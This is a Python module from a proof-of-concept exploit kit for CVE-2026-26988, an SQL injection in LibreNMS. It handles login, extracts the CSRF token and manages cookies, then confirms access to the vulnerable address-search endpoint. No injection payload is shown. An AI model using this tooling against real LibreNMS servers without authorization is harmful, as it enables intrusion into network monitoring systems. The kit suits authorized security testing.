#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : LibreNMS <= 25.12.0 SQL Injection via Address Search
# CVE            : CVE-2026-26988
# Vendor         : librenms
# Product        : LibreNMS
# Affected       : <= 25.12.0 (through 26.1.1)
# Type           : CWE-89 - SQL Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Shared authentication module for CVE-2026-26988 PoC scripts.

Uses subprocess curl for reliable authentication (handles redirects and
cookies natively), then provides a simple http.client-based session for
subsequent injection requests.
"""

import http.client
import urllib.parse
import subprocess
import time
import re
import os


REQUEST_TIMEOUT = 30


class HttpSession:
    """HTTP session with cookies for making injection requests."""

    def __init__(self, host, port, timeout=REQUEST_TIMEOUT):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.cookies = {}

    def _cookie_header(self):
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def post(self, path, data_dict, timeout_override=None):
        """Send POST request with form data, return (status, body, elapsed)."""
        body_str = urllib.parse.urlencode(data_dict)
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body_str)),
        }
        if self.cookies:
            headers["Cookie"] = self._cookie_header()

        t = timeout_override or self.timeout
        conn = http.client.HTTPConnection(self.host, self.port, timeout=t)
        start = time.time()
        try:
            conn.request("POST", path, body=body_str, headers=headers)
            resp = conn.getresponse()
            resp_body = resp.read().decode("utf-8", errors="replace")
            status = resp.status
            # Update cookies from response
            for h in resp.msg.get_all("Set-Cookie") or []:
                parts = h.split(";")[0]
                if "=" in parts:
                    name, value = parts.split("=", 1)
                    self.cookies[name.strip()] = value.strip()
        except Exception as e:
            return (0, str(e), time.time() - start)
        finally:
            conn.close()

        elapsed = time.time() - start
        return (status, resp_body, elapsed)


def _parse_cookie_file(cookie_file):
    """Parse a Netscape cookie file, handling #HttpOnly_ prefixed lines."""
    cookies = {}
    if not os.path.exists(cookie_file):
        return cookies
    with open(cookie_file, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Handle #HttpOnly_ prefix (curl marks HttpOnly cookies)
            if line.startswith("#HttpOnly_"):
                line = line[len("#HttpOnly_"):]
            elif line.startswith("#"):
                continue  # Skip comment lines
            fields = line.split("\t")
            if len(fields) >= 7:
                cookies[fields[5]] = fields[6]
    return cookies


def authenticate(host, port, username, password, timeout=REQUEST_TIMEOUT):
    """
    Authenticate to LibreNMS using curl (reliable cookie handling).

    Returns an HttpSession with valid session cookies, or None on failure.
    """
    base_url = f"http://{host}:{port}"
    cookie_file = f"/tmp/librenms_cookies_{os.getpid()}.txt"

    try:
        # Remove stale cookie file
        try:
            os.unlink(cookie_file)
        except OSError:
            pass

        # Step 1: GET /login to extract CSRF token + get initial cookies
        result = subprocess.run(
            ["curl", "-s", "-c", cookie_file, f"{base_url}/login"],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode != 0:
            print("[-] Failed to fetch login page")
            return None

        token_match = re.search(r'name="_token"\s+value="([^"]+)"', result.stdout)
        if not token_match:
            print("[-] Could not extract CSRF _token from login page")
            return None
        token = token_match.group(1)

        # Step 2: POST /login with --data-urlencode (avoids encoding issues)
        result = subprocess.run(
            ["curl", "-s",
             "-b", cookie_file, "-c", cookie_file,
             "--data-urlencode", f"_token={token}",
             "--data-urlencode", f"username={username}",
             "--data-urlencode", f"password={password}",
             "-D", "/dev/stderr",
             "-o", "/dev/null",
             f"{base_url}/login"],
            capture_output=True, text=True, timeout=timeout
        )

        # Check for redirect to dashboard (302 -> /) vs back to login
        if "Location: " in result.stderr:
            location = ""
            for line in result.stderr.split("\n"):
                if line.strip().lower().startswith("location:"):
                    location = line.split(":", 1)[1].strip()
                    break
            if "/login" in location:
                print("[-] Login failed: redirected back to login page")
                return None

        # Step 3: Follow redirect to establish final session
        subprocess.run(
            ["curl", "-s",
             "-b", cookie_file, "-c", cookie_file,
             "-o", "/dev/null",
             f"{base_url}/"],
            capture_output=True, text=True, timeout=timeout
        )

        # Step 4: Parse cookies from the Netscape cookie file
        session = HttpSession(host, port, timeout=timeout)
        session.cookies = _parse_cookie_file(cookie_file)

        if not session.cookies:
            print("[-] Login failed: no cookies extracted")
            return None

        # Step 5: Verify session works for ajax_table.php
        status, body, _ = session.post("/ajax_table.php", {
            "id": "address-search",
            "search_type": "ipv6",
            "address": "::1/64",
            "current": "1",
            "rowCount": "1",
        })
        if body.strip() == "Unauthorized":
            print("[-] Login failed: session not valid for ajax_table.php")
            print(f"    Cookies: {list(session.cookies.keys())}")
            return None

        print(f"[+] Authenticated as '{username}'")
        return session

    finally:
        try:
            os.unlink(cookie_file)
        except OSError:
            pass
